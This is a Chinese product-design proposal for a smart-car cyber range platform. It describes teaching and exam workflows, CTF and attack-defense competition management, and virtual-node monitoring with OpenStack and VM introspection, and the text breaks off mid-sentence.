title="排课授课流程"></a>排课授课流程</h5><p>设置教学班支持设置实验组、上课时间、课节、排课/实操模式。上课过程可查看学生在线状态、环境部署状态、对操作环境进行管理和接入，讲课模式、控制实操模式与讲课模式切换，支持与学员私聊和群聊。课程结束可查看答题记录，查看视频学习统计，查看报告评级。</p><p>学员可根据难度、课程类型、课程方向进行课程筛选并进入课程学习。学员可观摩教师操作投屏，也可以自己进入环境操作。课程结束后可查看学习进度，查看已学习课程。</p><h5 id="课程设计"><a href="#课程设计" class="headerlink" title="课程设计"></a>课程设计</h5><p>课程设计提供大型课程实验设计的能力，课程实验可根据用户需要进行定制。为了让学员能够根据实验内容，独立完成实验。实验管理模块提供了实验的创建、删除、修改等功能。在创建实验时，关联训练环境的工程模板，并在这个工程模板下设定本次实验的具体内容。实验管理模块还支持非实操型实验的管理。同时，在创建实验时，创建实验的指导书，其包含了实验的概述、目的、环境和操作的详细步骤等信息，学员可以参照详细步骤完成本次训练，达到提升能力的效果。全面支持远程实验教学，支持教学和自学两种学习模式。</p><p>攻防靶场系统为教学课程提供了一个全面的设计平台，能够实现远程学习模式，使得教与学都不受地理位置的限制。</p><p>在课程设计方面，设计人员有能力将各类实验根据知识点的逻辑顺序组合成完整的课程。这种方法不仅使课程内容呈现出层次性和连贯性，而且有助于受训人员沿着由浅入深的路径学习，从而更加系统地掌握网络安全的关键知识和技能。</p><p>课程的设计除了理论知识以外，还支持拓扑绑定的操作实验，加强了实践操作的环节。通过选择具体的实验作为课程的一部分，教学内容变得更加丰富和直观。同时，管理系统允许教员给自己分配实操环境，并且支持屏幕共享功能，让学员能够同步观察教员的操作过程，加深理解和记忆。</p><p>此外，该系统还能够灵活切换教员讲课和学生实操的模式。在教员讲课模式下，学生可以通过观看教员的屏幕操作来学习具体步骤和方法。实操模式则允许学生进入自己的实验环境中，实际操作课程内容，而教师则能够通过投屏监控和指导学生的操作。</p><p>综上，该系统为网络安全教学提供了一个集理论教学、操作练习和实验演练为一体的综合平台，旨在提升网络安全教育的质量和效果。</p><h5 id="排课授课"><a href="#排课授课" class="headerlink" title="排课授课"></a>排课授课</h5><p>系统通过排课管理功能简化课程安排流程，确保学员能快速分配到实操环境，提高教学效率。支持教员定制自己的课程及实验，并分享给其他人使用。支持教员授课模式实验教学，教员建立自己的实操环境并将自己的屏幕分享给学员。</p><p>系统包含了一个全面的课程管理功能，其旨在提供给教员一个便捷、高效的教学管理体验。</p><p>首先，系统允许教员对课程内容进行细致的管理，包括章节和课时的编辑与修改。这不仅提供了教程内容的结构化介绍，还加入了动态的编辑功能，以适应课程变化和实时更新的需求。</p><p>课时资源管理是系统的核心功能，教员能够上传必要的教学资源，对已上传的资源进行修改，以及预览和查看这些资源。这保证了课时资源可以随时更新和增强，从而维持教学内容的时效性和适宜性。</p><p>在排课管理方面，教员可以依据提供的日历功能进行自主排课，确保按照教学计划进行教学活动。此外，系统支持排课实验环境的自动部署，使得必要的教学资源能够及时就绪。为了避免资源浪费，排课环境资源默认被保留48小时，但系统也提供选项来配置保留时长，以适应特定的教学需求。</p><p>学员体验同样被系统所重视，教员可以通过实验组邀请学员加入，而学员则可以通过系统观看教师分享的屏幕进行学习，这强化了学员的互动和参与度。这一套综合性的管理功能，使得系统成为一个不仅强调教学内容丰富，也致力于提升教学效率和学习体验的教学管理平台。</p><p>在教学管理系统中，创建和管理教学班级是教师工作流程中的基础环节。通过这个功能，教师能高效地建立起班级的结构，并根据教学活动的要求设定和调整教学模式。系统为教师提供两种基本的教学模式，首先是讲课模式，这是以讲授理论知识为主，适用于理论学科或新概念的引入阶段。其次是实操模式，这一模式侧重于技能的实践操作和实验，帮助学员通过亲身实践来深化对理论的理解和应用。</p><p>系统中的班级成员管理功能为教师提供了灵活的班级组织手段，允许教师直接邀请或添加学员账号，建立起成员名单。这种管理使教师能够根据学员的具体情况，定制教学计划和排课内容，进而提高教学的针对性和有效性。</p><p>课程排期环节通过日历的形式展现，让授课人员能够直观地安排和规划课程时间表。教师可以选择一段特定的时间，在日历上安排一项特定的课程活动，包括理论讲授和实操练习。一旦排期完成，就会及时通知参与的学员，学生们可以访问系统查看自己的课程安排，做好相应的准备。</p><p>这种课程管理系统的优势在于保证了教学活动的系统性和条理性，同时也为参与者提供了适时和透明的信息流通，从而为教学和学习的顺利实施打下了坚实的基础。</p><p>1）教员添加我的教学班级，填写教学班级名称，选择教学分类，选择班级，选择多个课程、多个实验，如下图所示：</p><p>2）教员对教学班级进行管理，具体的操作有修改、删除教学班级和教学环境部署等操作，部署的操作分为单个的部署、销毁以及批量的部署和销毁。同时部署完成的教学环境也提供了进入教学环境的入口，如下图所示：</p><p>分别给班级按日历时间添加教学模式、排课计划。</p><p>提供排课时间系统通知功能，在课前5分钟能够发送系统内通知消息给用户。</p><h5 id="模式切换"><a href="#模式切换" class="headerlink" title="模式切换"></a>模式切换</h5><p>该系统提供了一个功能齐全的教学管理界面，允许教员为学员分配并管理个人化的实验环境。学员随后可以登录系统，并独立进入到自己被分配的实验环境中进行各种操作实践。这种设置可以保证学员在一个控制和隔离的环境中学习和实践，而不会影响到其他用户的实验环境。教员可以选择分享自己的屏幕给学员观看，或者让学员在自己的实验环境中进行实操学习。系统还提供了教学模式的切换，教员可以根据教学需求选择实操或讲课模式，并通过点击相应的讲课或实操按钮进行切换。这样，教员可以灵活地管理学员的实验环境，并根据需要进行不同的教学方式和指导。</p><h4 id="技能考试"><a href="#技能考试" class="headerlink" title="技能考试"></a>技能考试</h4><p>网络学习平台的在线考试功能为教师提供了多种便利:</p><p>教师可以根据题库快速生成试卷,也可以自定义组卷。并可以灵活设置每道题的分值。</p><p>教师可以按班级或学员个体安排考试计划,在考试开始前系统会自动发出通知。考试结束后,系统具备自动阅卷功能。学员可以查看每题得分情况和正确答案解析。</p><p>教师可以通过多维考试报告了解学生的考试表现,如正确率、成绩分布、平均作答时间等。在考试开始前5分钟,系统会自动发出考试通知,并在考试时间内开启,在结束时自动禁止答题。</p><p>学员可以在规定时间内登录系统在线进行考试答题。</p><p>通过提供全流程的在线考试功能,教职员工可以高效组织网络教学中的练习检测,学员也可以进行在线考试,整个考试管理和执行流程规范化。</p><h5 id="考试流程"><a href="#考试流程" class="headerlink" title="考试流程"></a>考试流程</h5><p>考试准备过程包含试题库创建，支持主观题和客观题。创建试卷可设置考试难度和选题。创建考试可选择课程班级的学员，选择考试题目，选择考试时间。学员会受到考试公告。</p><p>在考试系统中，学员会在考试开始前五分钟收到提醒。考试时间一到，系统允许学员进入并开始作答。完成后，系统自动评分客观题如单选和多选题，对主观题则生成待评分项，最终汇总出学员的成绩单。</p><p>考试结束后教员可查看成绩并发送，学员能看到成绩单和成绩排名。</p><h5 id="试卷制定"><a href="#试卷制定" class="headerlink" title="试卷制定"></a>试卷制定</h5><p>系统提供了灵活的考试模式设置，满足不同类型考核的需求。考试模式的设置至少包括以下几种：</p><p>1. 理论考试模式：传统的考试形式，考察学员对知识点的理解和记忆。题型可以包括单选题、多选题和判断题，允许教师设置标准的文本问题，学员在线选择或标记答案。</p><p>2. 实验操作类考试模式：这种模式适用于实践技能和操作过程的考核。系统可能会提供一个虚拟的实验或模拟环境，学员需要在其中完成一系列的具体任务，如编程、配置网络或修复安全漏洞。</p><p>3. 混合类考试模式：结合了理论和实验操作的考试方式，学员既要回答关于概念性知识的问题，同时也要在实验环境中执行具体的操作。这种模式可以全面考察学员的综合能力，既包括知识掌握程度，也涉及实操技能。</p><p>系统支持多场考试同时进行，使得不同的班级或不同科目的测试可以互不干扰地同时举行。这大大提高了评估的灵活性和效率。每次考试都可以自定义题库，按照需要随机抽题或指定题目，确保考试的公平性和随机性。</p><p>该系统针对考试管理的综合性设计，使教师能够高效地组织和监督考试，学员能够方便地参与考核，为教育和培训提供了强有力的技术支持。</p><h5 id="考试计划"><a href="#考试计划" class="headerlink" title="考试计划"></a>考试计划</h5><p>考试计划制定支持结合课程体系设置考试方案。设计师可根据课程、学院班级设置考试。系统支持自测考试模式，学员可根据自身水平和学习领域设置自测。</p><h5 id="分数统计"><a href="#分数统计" class="headerlink" title="分数统计"></a>分数统计</h5><p>提供考试自动阅卷功能，教员在考试结束之后，能够查看学员的答题细节，并能够查看考试排名，发布成绩。学员在成绩发布之后，能查看考试得分细节，并能查看试卷中题目的正确答题及试题解析。</p><h5 id="考试报告"><a href="#考试报告" class="headerlink" title="考试报告"></a>考试报告</h5><p>考试提供对于考试的各种信息的展示，包括知识点掌握情况汇总、试卷构成汇总，教员可以查看报告并将报告导出。</p><h2 id="网络安全攻防与汽车测评竞赛模块"><a href="#网络安全攻防与汽车测评竞赛模块" class="headerlink" title="网络安全攻防与汽车测评竞赛模块"></a>网络安全攻防与汽车测评竞赛模块</h2><ul><li>支持夺旗赛赛题环境的快速构建与管理，能够根据选择的队伍与赛题一键生成比赛环境，提供产品功能截图证明；</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/a8f3c1ef940efa63924e260248047269.png" alt="IMG_256"></p><p>赛题环境的快速构建与管理</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/0c7444020595d79e00b2eea6f3b1dcad.png" alt="IMG_256"></p><p>一键生成比赛环境</p><ul><li>支持比赛一血积分激励机制，第一个回答正确队伍可获得额外积分，可灵活设置激励队伍的百分比及分数，提供产品功能截图证明；</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/b2281b624a82b1f9d29f3b9651fca8fa.png" alt="IMG_256"></p><p>奖励机制</p><p>功能参数设计为，系统支持夺旗赛的赛事活动组织与管理，包括线上和线下模式，线上模式能生成外网访问的随机地址。实现夺旗赛赛题环境的快速构建与管理，一键生成比赛环境。系统支持比赛一血积分激励机制，第一个回答正确的队伍获得额外积分，可灵活设置激励队伍的比例及分数。提供比赛自动开始与停止管理，禁止选手比赛前后进入环境或答题。支持比赛的手动提前开始、结束，暂停、恢复及延期。</p><p>系统实现分阶段开放赛题、定时开放赛题及赛题开放通知。支持非固定Flag赛题的作弊检测，违规队伍可自动或手动禁赛、恢复比赛。队伍可申请解题提示，提示后正确答题可扣分，支持提示的定时发放。实现两种盲打方式：选手不可查看排行榜和提交Flag后不知答题正确与否。支持比赛一血赛题的消息公告，配置针对赛题或比赛的提交报告。</p><p>攻防赛赛事活动定义，支持比赛队伍和选手管理，选手加入不同队伍参与比赛。快速生成攻防赛环境，包括路由器、交换机等，按网络拓扑自动生成，队伍环境相互隔离。提供比赛公告和私信管理，具备Flag验证、周期性更新、作弊检测、异常检测、积分计算、排行导出等功能。</p><p>针对攻防赛中赛题服务的检测及配置、管理功能，根据赛题类型设置检测内容，提供日志查看，启动、停止检测管理服务，根据服务状态自动算分。两种选手接入方式：Web接入或自带设备接入。支持比赛报告自动生成，包括具体比赛和队伍参与所有比赛的报告。比赛过程中支持周期分数重置，攻防赛Plus赛题设定不同分数，周期记分方式，比赛周期时长可自定义。</p><p>每个赛题配置防御检测脚本，选手提交防御补丁经检测成功后，获得队伍防御分数。攻击分数基于一次成功攻击，持续得分。选手上传防御包导致服务器异常时扣异常分数，支持赛题环境重置，配置重置次数超限扣重置分数。攻防赛Plus队伍得分统计包括总分、攻击得分、防守得分、防守失分、异常得分和失分。</p><p>知识赛组织与管理，设置赛题和选手，从题库挑选赛题，支持答题倒计时，比赛结束后查看答题结果。比赛环境的批量生成、部署、测试、流量采集、录屏监控等，环境需求的高层封装，自动计算填充部署参数。支持夺旗赛、攻防赛和攻防赛Plus模式下赛事相关要素的一键配置，展示配置进度和结果。根据赛题、队伍自动分配环境，生成队伍访问赛题的路由。支持赛前测试，重新开始还原比赛数据；比赛过程中监控答题过程，控制选手虚拟机，包括重启、重置等，进行禁赛、恢复管理；赛后提供队伍或个人得分查看，生成比赛报告。</p><p>性能参数设计为，系统支持50支队伍或200位选手同时参加比赛。竞赛实操（CTF）题目共600个，其中内置400个。</p><h4 id="方案设计-4"><a href="#方案设计-4" class="headerlink" title="方案设计"></a>方案设计</h4><p>1. 赛事活动组织与管理</p><p>支持线上夺旗赛模式，为外网访问生成随机地址；线下模式支持传统的物理场地设置。</p><p>支持夺旗赛、攻防赛和攻防赛Plus模式下赛事相关要素的一键配置，展示配置进度及结果。</p><p>支持比赛环境的批量生成、部署、测试、流量采集、录屏监控等功能。</p><p>支持环境需求的高层封装，自动计算填充比赛环境部署所需参数。</p><p>2. 赛题环境与赛事管理</p><p>支持赛题环境的快速构建与管理，一键生成比赛环境，自动分配队伍访问赛题路由，确保队伍间环境互不影响。</p><p>支持比赛自动开始与停止，禁止选手提前进入环境，比赛结束后禁止答题。</p><p>支持分阶段开放赛题、定时开放赛题，并发送赛题开放通知。</p><p>支持非固定Flag赛题的作弊检测，自动禁赛、手动禁赛以及恢复比赛的管理。</p><p>3. 积分与激励机制</p><p>支持一血积分激励机制，第一个回答正确的队伍可获得额外积分，激励队伍的百分比及分数可灵活设置。</p><p>支持攻防赛Plus中不同赛题设置不同分数，每个队伍设定相互独立且完全相同的答题环境。</p><p>支持比赛采用周期记分的方式，比赛周期时长可自定义，支持周期分数的重置。</p><p>4. 盲打与公告管理</p><p>支持至少两种盲打方式，选手不能查看排行榜或提交Flag后不知道答题是否正确。</p><p>支持比赛一血赛题的消息公告，配置针对赛题提交报告或针对比赛提交报告。</p><p>5. 攻防赛环境与队伍管理</p><p>支持攻防赛环境的快速生成，包括路由器、交换机等网络设备，按网络拓扑自动生成比赛环境，不同队伍环境相互隔离。</p><p>支持比赛队伍和选手管理，选手可加入不同的队伍进行不同场次的比赛。</p><p>支持攻防赛中赛题服务的检测及其配置与管理，赛题检测服务的日志查看功能，可启动、停止检测管理服务。</p><p>6. 接入与报告</p><p>支持两种选手接入比赛环境的方式：通过Web接入或选手自带设备接入。</p><p>支持针对具体比赛的比赛报告的自动生成；支持针对具体队伍参与的所有比赛的比赛报告的自动生成。</p><p>7. 防御与攻击得分</p><p>支持每个赛题配置防御检测脚本，选手提交赛题的防御补丁经检测成功通过后，获得队伍的防御分数。</p><p>支持每个赛题每个队伍获得攻击分数，一次攻击成功后在下个周期及后续周期持续得分。</p><p>8. 环境与监控管理</p><p>支持比赛过程中答题过程监控，对选手虚拟机进行控制，包括重启、重置等，对参赛队伍进行禁赛、恢复等管理。</p><p>支持赛前测试功能，重新开始会还原比赛数据。</p><p>9. 赛后管理</p><p>支持赛后队伍或个人的得分查看，生成比赛报告。</p><p>10. 竞赛实操题目</p><p>提供600个CTF题目，其中400个内置。</p><p>性能参数要求</p><p>支持50支队伍或200位选手同时参加比赛。</p><p>本方案提供了竞赛管理系统的详细架构，包括赛事的组织、赛题环境的管理、积分与激励机制、盲打与公告管理、攻防赛环境与队伍管理、接入与报告生成、防御与攻击得分机制、环境与监控管理、赛后管理，以及题目库的构建。性能参数保证了系统能够在高并发条件下稳定运行，满足大型赛事的需求。</p><h4 id="方案简介-2"><a href="#方案简介-2" class="headerlink" title="方案简介"></a>方案简介</h4><p>系统提供了全方位的知识竞赛组织和管理功能。用户可以自定义赛题和参赛人员，便捷地从题库选题来迅速组织比赛。比赛过程中，系统具备答题时间的倒计时功能，超时自动跳转至下一题。同时，支持以可视化的方式实时展示答题动态和排名情况。竞赛结束后，参赛者的答题详情能够被检索和审查。对于夺旗赛，系统同样提供了灵活的在线和现场赛事组织及管理功能，线上赛事可以通过网络访问系统生成的随机赛题环境路径。还支持一键式快速构建和管理夺旗赛的赛题环境，根据选择的队伍和赛题直接生成比赛环境，优化赛事的流畅性和参与者的体验。</p><p>支持比赛一血积分激励机制，可设置激励百分比及分数；支持比赛自动开始与停止管理功能，在竞技开始前禁止用户进入比赛详情，在竞技停止后禁止用户答题操作；支持分阶段生成比赛环境，支持分阶段放出赛题，支持放出题目时下发通知进行提示；支持对违规作弊的队伍进行禁赛与恢复管理；支持用户主动申请题目提示，对主动申请提示的队伍答对后进行相应的扣分处理；支持比赛过程中，下发题目提示，下发提示时进行消息通知；支持比赛开始后，用户登录到答题系统进行答题，比赛一血赛题的消息通知弹窗，支持赛后提交答题报告；支持夺旗比赛过程中的大屏可视化展示，可视化提供图表展示、包括比赛答题动态、比赛排名等；支持攻防赛事活动的定义，系统中包含了比赛队伍和人员管理功能，允许单个参赛者在不同的队伍里参与多场比赛。平台能够管理比赛公告和私信，同时配备了Flag验证和周期性更新机制，以及作弊和异常行为的检测功能。系统自动进行积分计算，并支持排行榜的导出，确保比赛的公正性和透明度；</p><p>支持竞赛可视化的快速定制。根据竞赛的类型，竞赛的规模大小，竞赛实时攻击的表现方式以及竞赛宣传的不同主题，采用可视化3D技术快速定制适合本次比赛的可视化界面。可视化提供的展示信息包含参赛团队的排行信息、参赛团队的实时攻击信息以及参赛团队的得分失分信息、攻击态势等。支持攻防赛中比赛流量的采集，能够按配置规则分析流量数据，评估并展示比赛态势；其中攻击态势以不同颜色弧线的方式展示各个队伍的攻防情况，队伍所在圆环的密度可以有效反应出当前攻击的激烈程度；系统能够自动创建特定比赛的报告，并同样支持自动生成特定队伍参与的所有比赛的综合报告。这些功能简化了赛后分析，为组织者和参赛者提供详尽的数据回顾。</p><p>系统支持夺旗赛赛事要素的一键配置，方便用户快速下发任务，并实时展示任务进度和结果。系统可以自动为选定的赛题和队伍分配环境，并生成独立的访问路由，以确保各队伍之间的环境不发生干扰。</p><p>比赛环境能够批量生成和部署，并支持测试、流量采集以及录屏监控的功能。高级的封装技术允许系统自动计算并填充部署所需的参数。</p><p>攻防赛环境的快速生成功能涵盖路由器、交换机、防火墙等网络设备，且能按照设定的网络拓扑自动生成环境，确保不同团队间的隔离。</p><p>比赛中，系统能检测和管理靶标服务，并根据靶标的类型自定义检测内容，同时提供日志查看和检测服务的管理功能。靶标服务状态还能自动进行计分或扣分。</p><p>系统支持竞赛人员以WEB接入或虚实互联的方式参与比赛。同时，提供对参赛队伍虚拟机的控制，包括启动、停止和重置操作，还支持对违规队伍的禁赛和恢复参赛的管理操作。如下图所示。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/68410411b8706427c8666be6307d329d.png"></p><p>测评竞赛</p><h1 id="智能汽车网络靶场数据采集分系统"><a href="#智能汽车网络靶场数据采集分系统" class="headerlink" title="智能汽车网络靶场数据采集分系统"></a>智能汽车网络靶场数据采集分系统</h1><h2 id="节点状态采集模块"><a href="#节点状态采集模块" class="headerlink" title="节点状态采集模块"></a>节点状态采集模块</h2><ul><li>支持目标网络环境内虚拟节点CPU利用率、内存利用率、磁盘利用率、磁盘IO读/写吞吐量、网卡出/入流量大小、网卡出/入丢包率等不少于6类节点状态信息进行采集，提供产品功能截图证明；</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/af3bc56d52828bed572ea62076619e56.png"></p><p>状态管理模块可通过灵活访问方式，对大规模网络仿真场景中的网络仿真节点进行监控。可及时发现网络仿真节点的部署状态、运行状态。提供快照功能，方便网络仿真节点从崩溃状态还原备份。保障了平台平稳运行，是实现大规模网络仿真的必要一步。</p><p>功能参数设计为，系统支持在目标网络环境内对虚拟节点的多项状态信息进行采集，包括CPU利用率、内存利用率、磁盘利用率、磁盘IO读/写吞吐量、网卡出/入流量大小、网卡出/入丢包率等六类节点状态。此外，系统还支持采集平台本身设备的运行状态，如CPU利用率、内存利用率、磁盘利用率等。系统能够通过脚本检测目标网络内服务的运行状态，并将结果进行有效反馈。</p><p>性能参数设计为，系统支持最多1400个虚拟节点状态信息的采集，确保能够高效处理大规模网络环境中的状态监控需求。这种设计能够为网络运维和安全监控提供全面的数据支撑，提高网络管理的效率和可靠性。</p><h4 id="方案设计-5"><a href="#方案设计-5" class="headerlink" title="方案设计"></a>方案设计</h4><h5 id="系统概述"><a href="#系统概述" class="headerlink" title="系统概述"></a>系统概述</h5><p>设计的竞赛管理系统将为组织者提供全面的赛事活动组织与管理能力，同时为参与者提供一个高效、公平和透明的竞赛环境。系统将包含以下核心功能模块：</p><p>赛事活动组织与管理</p><p>赛题环境与赛事管理</p><p>积分与激励机制</p><p>盲打与公告管理</p><p>攻防赛环境与队伍管理</p><p>接入与报告</p><p>防御与攻击得分</p><p>环境与监控管理</p><p>赛后管理</p><h5 id="赛事活动组织与管理"><a href="#赛事活动组织与管理" class="headerlink" title="赛事活动组织与管理"></a>赛事活动组织与管理</h5><p>系统将支持线上和线下夺旗赛模式，为线上赛事提供外网随机地址生成，确保每次比赛的独特性和安全性。此外，系统将提供一键配置功能，简化赛事设置过程，包括环境的批量生成、部署、测试、流量采集和录屏监控。环境需求的高层封装将自动计算填充所需的各种参数，以便快速搭建比赛环境。</p><h5 id="赛题环境与赛事管理"><a href="#赛题环境与赛事管理" class="headerlink" title="赛题环境与赛事管理"></a>赛题环境与赛事管理</h5><p>赛题环境的快速构建和管理是系统的关键特性之一。系统将支持一键生成比赛环境，以及自动分配队伍访问赛题的路由，确保队伍间环境的隔离。比赛的控制管理功能将包括自动开始与停止，分阶段开放赛题，定时开放赛题，并发送赛题开放通知。此外，系统将提供非固定Flag赛题的作弊检测和队伍禁赛管理。</p><h5 id="积分与激励机制"><a href="#积分与激励机制" class="headerlink" title="积分与激励机制"></a>积分与激励机制</h5><p>积分系统将支持一血积分激励机制，首个解题的队伍将获得额外积分，激励队伍的百分比及分数可以灵活设置。攻防赛Plus模式下，不同赛题将设置不同分数，每个队伍将拥有相互独立且完全相同的答题环境。比赛采用周期记分方式，周期时长可自定义，并支持周期分数的重置。</p><h5 id="盲打与公告管理"><a href="#盲打与公告管理" class="headerlink" title="盲打与公告管理"></a>盲打与公告管理</h5><p>系统将支持至少两种盲打方式，其中一种是选手不能查看排行榜，另一种是选手在提交Flag后不知道答题是否正确。同时，系统将支持比赛一血赛题的消息公告，配置针对赛题提交报告或针对比赛提交报告。</p><h5 id="攻防赛环境与队伍管理"><a href="#攻防赛环境与队伍管理" class="headerlink" title="攻防赛环境与队伍管理"></a>攻防赛环境与队伍管理</h5><p>攻防赛环境的管理将支持快速生成，包括路由器、交换机等网络设备，并根据网络拓扑自动生成比赛环境。系统将管理比赛队伍和选手，支持选手加入不同的队伍进行不同场次的比赛。同时，系统将提供攻防赛中赛题服务的检测及其配置与管理，赛题检测服务的日志查看功能，可启动、停止检测管理服务。</p><h5 id="接入与报告"><a href="#接入与报告" class="headerlink" title="接入与报告"></a>接入与报告</h5><p>系统将支持两种选手接入比赛环境的方式，包括通过Web接入或选手自带设备接入。针对具体比赛或队伍，系统将自动生成详细的比赛报告，包括得分、答题行为、使用的资源等信息。</p><h5 id="防御与攻击得分"><a href="#防御与攻击得分" class="headerlink" title="防御与攻击得分"></a>防御与攻击得分</h5><p>每个赛题将配置防御检测脚本，选手提交的防御补丁经检测成功通过后，获得队伍的防御分数。攻击分数的持续得分机制将确保一次攻击成功后，队伍在下个周期及后续周期持续得分。</p><h5 id="环境与监控管理"><a href="#环境与监控管理" class="headerlink" title="环境与监控管理"></a>环境与监控管理</h5><p>比赛过程中，系统将监控答题过程，并对选手虚拟机进行控制，包括重启、重置等。同时，系统将提供赛前测试功能，确保比赛数据的还原。</p><h5 id="赛后管理"><a href="#赛后管理" class="headerlink" title="赛后管理"></a>赛后管理</h5><p>赛后管理模块将支持得分查看和比赛报告的生成，为组织者和选手提供详细的赛事分析。</p><h5 id="性能设计"><a href="#性能设计" class="headerlink" title="性能设计"></a>性能设计</h5><p>系统将支持1400个虚拟节点状态信息的采集，包括CPU利用率、内存利用率、磁盘利用率、磁盘IO读/写吞吐量、网卡出/入流量大小、网卡出/入丢包率等信息。此外，系统还将支持平台本身设备运行状态的采集，包括CPU利用率、内存利用率、磁盘利用率等信息，并通过脚本检测目标网络内服务的运行状态，并将结果进行反馈。</p><p>系统将具备高度的自动化能力，能够实时监控和管理大规模的虚拟节点，确保竞赛的顺利进行。通过集成的监控和管理工具，系统将提供实时的反馈和报告，使组织者能够快速响应任何问题，保持竞赛的连续性和稳定性。</p><p>本竞赛管理系统设计方案旨在提供一个全面、可扩展和高度自动化的解决方案，以支持复杂的网络安全竞赛活动。通过综合利用现代化的技术和工具，系统将确保竞赛的高效运行，同时提供深度的数据分析和报告，以增强竞赛活动的价值和参与者的体验。</p><h4 id="方案简介-3"><a href="#方案简介-3" class="headerlink" title="方案简介"></a>方案简介</h4><p>状态管理模块现已实现以下功能：</p><p>系统的网络部署状态监控功能是针对复杂网络环境中各种资源的部署和管理的重要工具。这些功能允许管理员实时监控和管理网络部署的各个方面，包括：</p><p>1. 虚拟网络部署状态：监控整个虚拟网络的部署过程，包括子网的创建、VLAN配置、路由规则的应用等方面。</p><p>2. 虚拟节点部署状态：检测各个虚拟机或虚拟节点的部署情况，例如操作系统的加载、服务的启动、配置的应用等。</p><p>3. 网络节点和安防设备的部署状态：追踪网络中实体节点如交换机、路由器的部署状态，以及各类安防设备（如防火墙、入侵检测系统）的设置和运行状态。</p><p>为了使部署进程清晰可见，系统支持通过图形化界面展示部署进度。这通常涉及到进度条或图表，展示各个阶段的完成度，问题报告，以及任何需即时解决的关键事项。</p><p>界面显示可能会提供详细视图，如部署日志、资源利用率图、网络拓扑图等，便于管理员及时了解环境状态，并在必要时进行干预。管理员可以利用这些工具进行故障排除、性能优化和资源分配。</p><p>通过这种监控功能，系统确保网络环境的部署按照预定计划顺利进行，同时也提高了问题发现和解决的效率，保障网络环境的稳定性和可靠性。</p><p>对虚拟节点的运行状态进行实时监控，包括CPU利用率、内存利用率、磁盘IO和网卡流量等重要信息。通过监控工具，用户可以实时了解虚拟节点的性能指标和资源利用情况；支持虚拟机节点自动发现崩溃、无响应等状态，如下图所示；</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/b59c47cb99ae2d8224b3df71d42d1248.png"></p><p>虚拟节点监控</p><p>实现虚拟机从崩溃中自动恢复到初始状态或手动选择崩溃节点的处理方式，处理方式包括查看虚拟节点状态、重启、重置等操作；实现虚拟节点状态保存和恢复，并提供配置接口；每个虚拟机至少支持保存2个状态</p><p>支持通过Web桌面、远程桌面、Web SSH的方式接入网络节点，接入的方式支持VNC、RDP和SSH；支持对操作进行录屏；支持WINDOWS客户操作系统下USB存储的远程重定向，用户可在操作终端直接通过U盘存取虚拟主机中的信息；</p><p>支持利用虚拟机自省技术对虚拟机进行高速、无感的周期性和单次内部数据监控。支持多个虚拟机的并发的内部数据监控。支持Qemu2.9以上版本，监控过程中不能暂停虚拟机，虚拟机内部不能部署任何代码，不更改任何代码。周期性任务最小间隔时间少于5秒。Linux系统和Windows系统支持获取虚拟机的进程列表、进程命令行参数、进程运行目录、进程运行的环境变量、进程打开的句柄等。Linux系统还支持查看正在监听的端口，查看网卡信息，查看命令行日志，查看登录终端等。</p><p>带外采集系统支持windows系统和linux系统，使用了目前通用的Volatility和LibVMI。支持对多种命令的采集、并发采集。</p><p>性能参数如下：</p><ul><li>支持等于1400个虚拟节点状态信息采集。</li></ul><p>为了有效地监控目标网络部署状态，系统需具备以下几个关键功能：</p><p>1. 虚拟网络部署状态监控：</p><p>功能参数如下：能够实时跟踪和显示虚拟网络的创建和配置过程，包括子网设置、IP地址分配、网络连通性测试等。</p><p>功能参数如下：提供虚拟网络的拓扑视图，方便用户直观理解网络结构。</p><p>功能参数如下：报告网络部署过程中的任何异常，如配置失败、性能瓶颈等。</p><p>2. 虚拟节点部署状态监控：</p><p>功能参数如下：显示每个虚拟机或其他类型虚拟节点（如容器）的部署进度，包括操作系统启动、服务配置等。</p><p>功能参数如下：反馈虚拟节点磁盘、CPU和内存的利用情况，确保它们符合预设的资源分配策略。</p><p>功能参数如下：对于还未完成部署的节点，系统能够提供预计剩余时间和潜在问题的预警。</p><p>3. 网络节点和安防设备部署状态监控：</p><p>功能参数如下：对物理网络设备（如交换机、路由器）和安全设备（如防火墙、入侵检测/防御系统ID/IPS）的部署状态进行监控。</p><p>功能参数如下：实时检测硬件状态和配置的更改，确保所有设备均按预定方案运行。</p><p>功能参数如下：根据安全配置和策略实施情况，确保网络的安全性得到强化。</p><p>系统中的监控功能通常由以下几个部分组成：</p><p>- 实时数据仪表盘：提供关于当前部署状态的概览，包括哪些节点已上线，哪些正在进程中，以及遇到问题需注意的部分。</p><p>- 进度跟踪和历史记录：记录每次部署的详细历史，供进行问题追踪和性能分析。</p><p>- 警报和通知系统：在发生配置错误或设备故障时，系统会发送警报给管理员，以便及时干预。</p><p>通过综合这些工具和功能的系统，管理员能够确保部署过程符合技术和业务要求，同时及时发现并解决可能出现的问题。</p><p>neutron管理虚拟网络的配置情况，并将状态写入network db中,虚拟网络部署状态是horizon通过获取network db中信息进行实时更新。nova管理虚拟节点的配置情况，并将状态写入compute db中, 虚拟节点部署状态是horizon通过获取compute db中信息进行实时更新。网络节点和安防设备的部署状态通过horizon到对应的数据库中获取信息来实时更新状态。</p><p>实现对虚拟节点状态进行实时监控，网络流量监控默认是通过compute 的libvirt进行监控，记录网卡进入与出去流量统计，针对某个虚拟机的网卡，该方式记录所有网卡通过的流量统计。</p><p>网络bandwidth的采集是通过neutron-metering-agent 代理方式进行流量采集，然后push到oslo-messaging, ceilometer-agent-notification 